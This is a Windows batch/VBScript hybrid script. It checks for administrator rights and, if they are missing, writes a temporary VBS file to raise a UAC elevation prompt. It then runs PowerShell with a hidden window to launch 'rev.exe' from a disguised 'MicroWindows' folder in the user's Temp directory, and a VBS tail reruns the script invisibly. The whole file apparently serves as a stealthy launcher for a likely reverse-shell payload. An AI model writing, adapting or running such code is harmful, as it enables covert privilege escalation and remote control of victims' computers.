@if (@CodeSection == @Batch) @then

@echo off

if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
  >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
  >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if "%errorlevel%" NEQ "0" (
  goto UACPrompt
) else (
  goto gotAdmin
)

:UACPrompt
echo Set UAC = CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %*", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"

powershell -windowstyle hidden C:\Users\%username%\AppData\Local\Temp\MicroWindows\rev.exe

goto :EOF

@end

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""%~f0""", 0, False
WScript.Quit
exit /b